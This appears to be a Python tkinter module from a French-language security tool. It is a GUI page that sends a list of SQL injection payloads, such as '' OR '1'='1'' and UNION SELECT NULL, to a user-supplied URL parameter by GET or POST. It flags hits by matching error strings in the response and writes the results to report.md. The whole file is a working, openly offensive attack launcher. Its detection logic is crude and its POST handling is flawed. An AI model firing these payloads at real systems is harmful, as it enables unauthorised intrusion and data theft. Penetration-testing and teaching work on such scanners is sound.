import tkinter as tk
from tkinter import messagebox, filedialog, Toplevel, scrolledtext
import requests
import urllib.parse

class SQLiPage(tk.Frame):
    def __init__(self, parent, controller, global_url, show_button):
        super().__init__(parent)
        self.controller = controller
        self.global_url = global_url
        self.show_button = show_button

        # Titre
        self.title_label = tk.Label(self, text="SQL Injection Attack", font=("Arial", 16))
        self.title_label.pack(pady=20)

        # Champs URL et méthode
        self.url_label = tk.Label(self, text="URL cible (ex: http://example.com/search):")
        self.url_label.pack(pady=5)
        self.url_entry = tk.Entry(self, width=60)
        self.url_entry.pack(pady=5)
        self.url_entry.insert(0, self.global_url)
        self.method_label = tk.Label(self, text="Méthode HTTP :")
        self.method_label.pack(pady=5)
        self.method_var = tk.StringVar(value="GET")
        tk.Radiobutton(self, text="GET", variable=self.method_var, value="GET").pack()
        tk.Radiobutton(self, text="POST", variable=self.method_var, value="POST").pack()

        # Paramètre et champ payloads
        self.param_label = tk.Label(self, text="Nom du paramètre à injecter :")
        self.param_label.pack(pady=5)
        self.param_entry = tk.Entry(self, width=40)
        self.param_entry.pack(pady=5)

        self.payload_label = tk.Label(self, text="Payloads SQL : (séparés par des virgules ou importer un fichier)")
        self.payload_label.pack(pady=5)
        default_payloads = [
            "' OR '1'='1'", "' OR 'a'='a'", "' OR 'x'='x'", "1 OR 1=1", "' UNION SELECT NULL --"
        ]
        self.payload_entry = tk.Entry(self, width=60)
        self.payload_entry.insert(0, ", ".join(default_payloads))
        self.payload_entry.pack(pady=5)

        self.load_payload_button = tk.Button(self, text="Importer un fichier de payloads", command=self.load_payload_file)
        self.load_payload_button.pack(pady=5)

        # En-têtes HTTP
        self.headers_label = tk.Label(self, text="Headers HTTP (facultatif, clé:valeur séparés par des virgules):")
        self.headers_label.pack(pady=5)
        self.headers_entry = tk.Entry(self, width=60)
        self.headers_entry.pack(pady=5)

        # Bouton pour lancer l'attaque
        if self.show_button:
            self.start_button = tk.Button(self, text="Lancer l'attaque SQLi", command=self.start_attack)
            self.start_button.pack(pady=10)

        # Label pour afficher le statut
        self.status_label = tk.Label(self, text="", font=("Arial", 12))
        self.status_label.pack(pady=10)

        # Textarea pour afficher les résultats
        self.results_text = scrolledtext.ScrolledText(self, wrap=tk.WORD, width=80, height=20, state=tk.DISABLED)
        self.results_text.pack(pady=10, padx=10)

    def load_payload_file(self):
        """Charge les payloads SQL à partir d'un fichier texte."""
        file_path = filedialog.askopenfilename(filetypes=[("Fichiers texte", "*.txt")])
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    payloads = f.readlines()
                self.payload_entry.delete(0, tk.END)
                self.payload_entry.insert(0, ', '.join(p.strip() for p in payloads))
                messagebox.showinfo("Succès", "Payloads chargés depuis le fichier.")
            except Exception as e:
                messagebox.showerror("Erreur", f"Impossible de charger le fichier : {e}")

    def start_attack(self):
        """Démarre l'attaque SQLi."""
        url = self.url_entry.get()
        param = self.param_entry.get()
        method = self.method_var.get()
        payloads = self.payload_entry.get().split(',')
        headers_text = self.headers_entry.get()

        if not url or not param or not payloads:
            messagebox.showerror("Erreur", "Veuillez remplir tous les champs obligatoires.")
            return

        # Convertir les headers en dictionnaire
        headers = {}
        if headers_text:
            try:
                headers = dict(item.split(":") for item in headers_text.split(","))
            except Exception:
                messagebox.showerror("Erreur", "Format des headers incorrect (clé:valeur).")
                return

        self.status_label.config(text="L'attaque SQLi est en cours...")
        vulnerabilities = []

        # Tester chaque payload
        for payload in payloads:
            payload = payload.strip()

            # N'encoder que la partie du paramètre et du payload, sans couper d'apostrophe
            full_url = f"{url}?{param}={payload}"  # Construire l'URL complète sans encoder tout
            encoded_url = urllib.parse.quote(full_url, safe=":/?=&")  # Encoder l'URL mais garder les parties sûres
            print(f"Requête GET générée : {encoded_url}")  # Debug
            if self.test_sqli(encoded_url, method, headers):
                vulnerabilities.append(payload)  # Ajouter le payload détecté comme vulnérable

        # Afficher les résultats
        self.show_results(vulnerabilities)

    def test_sqli(self, url, method, headers):
        """Tester un paramètre avec un payload SQLi."""
        try:
            if method == "GET":
                # Requête GET avec l'URL encodée
                response = requests.get(url, headers=headers)
            else:  # POST
                data = {url.split('?')[1].split('=')[0]: url.split('=')[1]}
                response = requests.post(url, data=data, headers=headers)

            # Détecter une vulnérabilité
            if "sql" in response.text.lower() or "syntax" in response.text.lower() or "mysql" in response.text.lower():
                return True
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la requête : {e}")
        return False

    def show_results(self, vulnerabilities):
        """Affiche les résultats dans une textarea."""
        if vulnerabilities:
            result_text = "Vulnérabilités détectées avec les payloads suivants :\n" + "\n".join(vulnerabilities)
        else:
            result_text = "Aucune vulnérabilité détectée."

        self.results_text.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, result_text)
        self.results_text.config(state=tk.DISABLED)

        with open("report.md", "a", encoding="utf-8") as file:
            file.write("## SQL Injection\n")
            file.write(f"- URL cible : {self.global_url}\n")
            file.write(f"- Paramètre : {self.param_entry.get()}\n")
            file.write(f"- Méthode : {self.method_var.get()}\n")
            file.write(f"- Payloads : {self.payload_entry.get()}\n")
            file.write(f"- Headers : {self.headers_entry.get()}\n")
            file.write(f"- Résultats : \n")
            if vulnerabilities:
                for payload in vulnerabilities:
                    file.write(f"    - {payload}\n")
            else:
                file.write("    - Aucune vulnérabilité détectée.\n")
            file.write("\n\n")
